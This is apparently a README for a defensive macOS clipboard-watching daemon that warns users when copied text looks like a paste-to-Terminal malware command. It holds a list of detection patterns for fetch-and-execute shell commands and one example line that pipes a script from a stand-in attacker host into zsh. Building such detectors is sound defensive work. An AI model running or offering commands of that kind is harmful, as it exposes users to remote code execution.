---
name: zergguard-clipboard-guard
description: "Continuous clipboard-watching daemon. Catches paste-to-Terminal malware delivery BEFORE you paste. Polls pbpaste every 2s; when clipboard content matches dangerous shell-execution patterns (curl|sh, base64 -d|sh, eval $(curl), wget|sh, suspicious TLDs), fires an immediate macOS notification — \"ZergGuard: clipboard looks like a paste-to-Terminal attack.\" Runs as LaunchAgent with KeepAlive — silent unless triggered. Direct countermeasure to the 2026-05-01 \"Inc Apple\" attack class. Verbs — `python3 guard.py` (run foreground, debug), `python3 guard.py --test` (paste a known-bad string and verify detection)."
---

# zergguard-clipboard-guard

The most-effective ZergGuard protection layer because it intercepts the attack **before** the malicious command reaches Terminal.

## How it works

1. LaunchAgent `com.matteisner.zergguard-clipboard` runs `guard.py` continuously.
2. Polls `pbpaste` every 2 seconds.
3. When the clipboard changes AND matches a dangerous pattern, fires a macOS notification + writes a log line to `~/.config/zerg-guard/clipboard.log`.
4. Does NOT modify or clear the clipboard — only warns. You retain agency.

## Patterns it catches

Reuses `~/.config/zerg-guard/lib/ioc.py:SHELL_RED_FLAG_PATTERNS`:
- `curl … | sh` / `| zsh` / `| bash`
- `wget … | sh`
- `base64 -d … | sh`
- `eval $(curl …)`
- `curl --insecure`
- `chmod +x && curl …`
- `osascript … do shell script … curl …`

Plus known-bad-domain match from `KNOWN_BAD_DOMAINS`.

## When you'll see it fire

- Phishing page tells you to paste `curl evil.com/loader.sh | zsh` → fires before you paste.
- Someone DMs you a "quick fix" with `eval $(curl ...)` → fires.
- You're following a legit tutorial that uses `curl trusted-host | sh` → does NOT fire (trusted-installer whitelist in ioc.py).

## Whitelist

Trusted installer hosts (sh.rustup.rs, brew.sh, claude.ai/install.sh, etc.) live in `TRUSTED_INSTALLER_HOSTS`. Add to this list if you find false positives.

## Test

```bash
python3 ~/.claude/skills/zergguard-clipboard-guard/guard.py --test
```

Pipes a known-bad pattern into the clipboard via pbcopy, waits for the daemon to detect, prints whether notification fired.

## Disable

```bash
launchctl unload ~/Library/LaunchAgents/com.matteisner.zergguard-clipboard.plist
```
